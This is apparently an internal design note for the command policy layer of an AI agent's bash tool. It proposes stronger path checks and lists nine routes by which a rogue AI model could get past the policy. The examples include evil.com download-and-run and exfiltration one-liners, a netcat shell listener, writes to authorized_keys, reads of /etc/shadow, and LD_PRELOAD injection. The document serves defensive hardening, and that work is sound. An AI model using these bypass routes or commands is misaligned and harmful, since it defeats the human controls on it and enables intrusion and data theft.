# Policy: path argument checking in `checkPathAccess`

## Current state

`checkPathAccess` in `policy.ts` attempts to block file-access commands from
reaching paths outside the workspace. The current implementation has two
structural weaknesses that make it an incomplete defence.

### Weakness 1 — paths embedded in flag values are not inspected

The current code collects path candidates with:

```ts
const pathArgs = args.filter((a) => !a.startsWith('-'));
```

This drops every token that begins with `-`, including long-form flags of the
form `--flag=value`. A command like:

```
cp --target-directory=/etc/cron.d file
mv --backup=/tmp/evil src
```

passes unchecked because `--target-directory=/etc/cron.d` is discarded before
any path validation occurs. The embedded absolute path is never seen.

A naïve fix (`flatMap` over `=`-split values) was considered but rejected
because it is still incomplete — it would miss space-separated flag values
(`cp --target-directory /etc file`) and would also pull in non-path values
(e.g. `--suffix=~`, `--attributes=rw`) that happen to contain `/`.

### Weakness 2 — the binary allowlist is narrow and gives false confidence

`checkPathAccess` only applies to 8 binaries:
`cat`, `head`, `less`, `more`, `cp`, `mv`, `tee`, `ln`.

Many other allowed binaries also take file path arguments:
`awk`, `sed`, `tr`, `sort`, `wc`, `diff`, `patch`, `xargs`, `find`, `grep`,
`cut`, `jq`, `python3 -c`, `node -e`, etc. None of these are in the list.
In CI mode — where there is no filesystem-level sandbox (no bwrap, no Seatbelt)
— this means the policy layer is the sole guard and it covers only a fraction
of the surface.

## Proposed solution

Rather than maintaining a binary allowlist with hand-rolled argument parsing,
path checking should be **argument-driven**: scan every token in a command
for strings that look like filesystem paths and validate each one against the
workspace root using the existing `resolveWithinCwd` from
`src/shared/utils/security.ts`.

### Step 1 — add a `looksLikePath` heuristic to `security.ts`

```ts
/**
 * Returns true if `token` looks like a filesystem path — either absolute
 * (starts with '/') or a relative sequence that contains '/' (e.g. './foo',
 * '../bar', 'subdir/file'). Single-word tokens without a slash are not
 * treated as paths (they are flag names, binary names, or plain arguments).
 */
export function looksLikePath(token: string): boolean {
  return token.startsWith('/') || token.includes('/');
}
```

### Step 2 — replace `checkPathAccess` with `checkPathsInArgs`

Extract all path-like tokens from every argument — positional and flag values
alike — and validate each against the workspace root:

```ts
function extractPathCandidates(args: string[]): string[] {
  const candidates: string[] = [];
  for (const arg of args) {
    if (!arg.startsWith('-')) {
      // Positional arg — always a candidate if it looks like a path.
      if (looksLikePath(arg)) candidates.push(arg);
    } else {
      // Flag: extract value from --flag=value form.
      const eqIdx = arg.indexOf('=');
      if (eqIdx !== -1) {
        const value = arg.slice(eqIdx + 1);
        if (looksLikePath(value)) candidates.push(value);
      }
      // Space-separated --flag value is handled because the value will appear
      // as the next positional arg in the args array — it starts with no '-'
      // and is caught by the first branch above.
    }
  }
  return candidates;
}

function checkPathsInArgs(
  binaryBase: string,
  args: string[],
  workspaceRoot?: string,
): PolicyOutcome | null {
  const candidates = extractPathCandidates(args);
  for (const p of candidates) {
    const base = workspaceRoot ?? DEFAULT_WORKSPACE_ROOTS[0]!;
    if (resolveWithinCwd(base, p) === null) {
      return deny(
        'path-outside-workspace',
        `${binaryBase} argument references a path outside the workspace: ${p}`,
      );
    }
  }
  return null;
}
```

### Step 3 — apply universally, not per-binary

Call `checkPathsInArgs` for **all** commands that are not already handled by a
more specific check (git, package managers, shell invocations, interactive
REPLs). Remove the hardcoded binary list. This means the check applies to
`awk`, `sed`, `diff`, `jq`, `python3`, `node`, and everything else that the
hard-deny list does not already block.

```ts
// In checkSingleCommand, replace the current checkPathAccess call:
if ((result = checkPathsInArgs(binaryBase, args, config.workspaceRoot))) return result;
```

### Caveats to address during implementation

- **`~` and `-` expansion**: these are handled by the shell before args reach
  the policy layer (they appear as expanded strings). Confirm this with the
  parser before removing the explicit `~`/`-` checks in `isAllowedCdTarget`.
- **False positives on non-path arguments**: a token like `1/2` (arithmetic)
  or `application/json` (MIME type) would match `looksLikePath`. In practice
  these are uncommon in the allowed binary set; if they occur the heuristic
  can be tightened (e.g. require the token to start with `/`, `./`, or `../`,
  or to contain a path separator followed by a non-digit).
- **`tee` and `less` are in HARD_DENY_BINARIES**: they are already blocked
  before `checkPathAccess` is reached. They can be removed from any
  per-binary list in the new implementation.

## Current status

The naïve `flatMap` fix (splitting on `=`) was reverted. The weaknesses above
are documented here pending a proper implementation. In the meantime, the CI
sandbox (rlimits + network proxy) provides partial mitigation; the Seatbelt
(macOS) and bwrap (Linux) modes provide full filesystem confinement.

---

## Adversarial analysis: creative bypass routes in the current policy evaluator

The following scenarios were evaluated against the policy as of commit `856cf05`
on `feat-bash-tool`. Each represents a route by which a rogue AI model could
circumvent policy enforcement. Severity ratings assume CI mode (no filesystem
sandbox).

### A. `node -e` and `python3 -c` — full escape hatches (critical)

`node` and `python3` are not in `HARD_DENY_BINARIES` and are not blocked by any
specific check. A one-liner can spawn arbitrary child processes:

```sh
node -e "require('child_process').execSync('curl https://evil.com | sh')"
python3 -c "import subprocess; subprocess.run(['curl','https://evil.com','-o','/tmp/x'])"
```

These completely bypass the policy layer because the policy sees a safe-looking
binary (`node`, `python3`) with a `-e`/`-c` string argument. The embedded shell
command is never parsed or evaluated. In CI mode, with no filesystem sandbox,
the spawned subprocess inherits the workspace environment with no additional
restrictions.

**Recommended fix:** add `node`, `python3`, `python`, `ruby`, `perl`, `php`,
`deno`, `bun` to `HARD_DENY_BINARIES`, or add a dedicated `checkScriptingRepl`
that denies any invocation passing a `-e`, `-c`, or `--eval` flag containing
shell metacharacters or subshell syntax.

### B. `sh script.sh` / `bash --init-file` — shell invocation bypasses

`checkShellInvocation` blocks `bash -c <cmd>` and `sh -c <cmd>` (concatenated
form). However, several equivalent invocations are not blocked:

```sh
sh ./evil.sh                  # runs a script file — not checked as a command string
bash --init-file .bashrc      # --init-file sets startup file, effectively arbitrary exec
bash --rcfile /tmp/evil        # same via alias flag
bash -i                       # interactive bash reads ~/.bashrc, which can be poisoned
bash --login                  # interactive login reads /etc/profile, ~/.bash_profile
```

`bash -i` and `bash --login` are only denied if the `-c` flag is also present.
A standalone `bash -i` succeeds policy evaluation and opens a persistent
interactive shell inside the session, from which the AI can issue arbitrary
commands with no further policy checks.

**Recommended fix:** deny `bash`/`sh`/`zsh`/`dash`/`ksh` unconditionally unless
the only allowed form (read-only subshell for one specific use case) is
explicitly needed. The current `checkShellInvocation` should also block `--init-file`,
`--rcfile`, and bare interactive `-i`/`--login` flags.

### C. `busybox` — binary deny-list bypass

`busybox` is a multi-call binary that implements `wget`, `nc`, `httpd`, `ftpd`,
`telnet`, and many more commands. It is not in `HARD_DENY_BINARIES`. A rogue
model can use:

```sh
busybox wget https://evil.com/payload -O /tmp/payload
busybox nc -lvp 4444 -e /bin/sh
busybox httpd -f -p 8080 -h /workspace
```

Because `busybox` is not in the deny list, none of these are blocked.

**Recommended fix:** add `busybox` to `HARD_DENY_BINARIES`.

### D. Relative path redirection — not blocked by `checkStructural`

`checkStructural` flags `hasRedirection` but `evaluatePolicy` does not deny on
it — it only returns the flag as metadata. A rogue model can redirect output to
relative paths that escape the workspace:

```sh
cat /etc/passwd > ../../output.txt
echo payload >> ../../../home/user/.ssh/authorized_keys
```

The policy sees `hasRedirection: true` but takes no action. `checkPathAccess`
is only called after the structural check and only for the 8 hardcoded binaries;
`cat` is on the list but the check only scans positional args — `>
../../output.txt` is the shell redirection, not an arg.

**Recommended fix:** parse redirection targets from the raw command string and
validate them through `resolveWithinCwd` the same way positional path args are
validated.

### E. `git diff --ext-diff` — arbitrary command execution via allowed subcommand

`git diff` is in `ALLOWED_GIT_SUBCOMMANDS`. The `--ext-diff` flag causes git
to run an external program to perform the diff:

```sh
git diff --ext-diff=curl HEAD
git config diff.tool curl && git diff --tool HEAD
```

This is effectively arbitrary command execution via an allowed git subcommand.
The external program receives the file paths as arguments and runs with full
workspace access.

**Recommended fix:** add `--ext-diff` to `DENIED_GIT_OPTIONS` and check for it
using `flagValues`. Also deny `git difftool` and `git mergetool`.

### F. `git archive --remote` — network access via allowed subcommand

`git archive` is in `ALLOWED_GIT_SUBCOMMANDS`. The `--remote` flag fetches an
archive from a remote URL:

```sh
git archive --remote=https://evil.com/repo HEAD > /tmp/out.tar
```

This bypasses the network proxy (the subprocess connects directly, not via the
policy-enforced channel) and can also write to arbitrary paths via redirection.

**Recommended fix:** deny `git archive --remote` by checking for `--remote` in
`flagValues(args, '--remote')` within `checkGitCommand` for the `archive`
subcommand.

### G. `awk`, `sed`, `find`, `xargs` — unrestricted file access

As documented in the `checkPathAccess` section above, these binaries are not
covered by any path check. Examples:

```sh
awk '{print}' /etc/shadow > /tmp/leak
sed -n 'p' /etc/passwd
find / -name '*.key' -exec cat {} \;
xargs -a /proc/1/cmdline cat
find /workspace -type f | xargs grep -r 'API_KEY' > /tmp/leak
```

`find -exec` is particularly dangerous because it uses the shell to spawn
arbitrary commands against results that may include paths outside the workspace.

**Recommended fix:** covered by the `checkPathsInArgs` redesign above. Additionally,
`find -exec` should be treated like a shell invocation and denied outright, or
`find` should be added to `HARD_DENY_BINARIES`.

### H. Symlink and binary-name bypasses

The deny list matches on `binary` (the first word after env assignments). If the
workspace contains a symlink or wrapper script named `ls` that actually runs `curl`:

```sh
./curl https://evil.com    # binary is './curl' — startsWith check on base name
../bin/wget https://evil.com
```

`policy.ts` calls `path.basename(binaryRaw)` to extract the base name for deny-list
matching. A binary at `./curl` has basename `curl` which IS in `HARD_DENY_BINARIES`
— so this specific case is already blocked. However, a binary at a relative path
that is NOT in the deny list (e.g. `./node_modules/.bin/ts-node`) could embed
arbitrary logic and is not subject to any argument-level checks.

**Status:** partially mitigated by `resolveWithinCwd` path normalization on the
binary path itself (if implemented). The key gap is that custom scripts/symlinks
in the workspace are inherently trusted by the current model.

### I. Environment variable injection via `env`

`env` is not in `HARD_DENY_BINARIES`. The `env` command can set arbitrary
environment variables and then execute a binary:

```sh
env LD_PRELOAD=/tmp/evil.so ls
env NODE_OPTIONS='--require /tmp/evil' node app.js
env BASH_ENV=/tmp/evil.sh bash -c 'true'
```

`checkEnvHijacking` in `policy.ts` scans inline `KEY=VAL` assignments at the
start of a command (e.g. `LD_PRELOAD=/tmp/evil.so ls`) but does not handle the
`env KEY=VAL CMD` form.

**Recommended fix:** add `env` to `HARD_DENY_BINARIES`, or add a
`checkEnvCommand` that extracts all `KEY=VAL` tokens from `env` args and
subjects them to the same `checkEnvHijacking` patterns.

---

### Summary table

| Bypass | Severity | Blocked by sandbox? | Fix required |
|--------|----------|---------------------|--------------|
| `node -e` / `python3 -c` child_process | Critical | No (CI mode) | Deny scripting repls with eval flags |
| `bash -i` / `bash --login` | High | Partial | Block bare interactive shell flags |
| `busybox wget`/`nc`/etc. | High | Network proxy only | Add busybox to deny list |
| Relative path redirection (`>`) | High | No (CI mode) | Validate redirection targets |
| `git diff --ext-diff` | High | No | Deny `--ext-diff` / `difftool` |
| `git archive --remote` | Medium | No | Deny `archive --remote` |
| `awk`/`sed`/`find`/`xargs` file access | Medium | No (CI mode) | `checkPathsInArgs` redesign |
| `env LD_PRELOAD=...` | Medium | Partial | Deny `env` or add check |
| Symlinks / workspace scripts | Low | Inherent trust model | Out of scope |
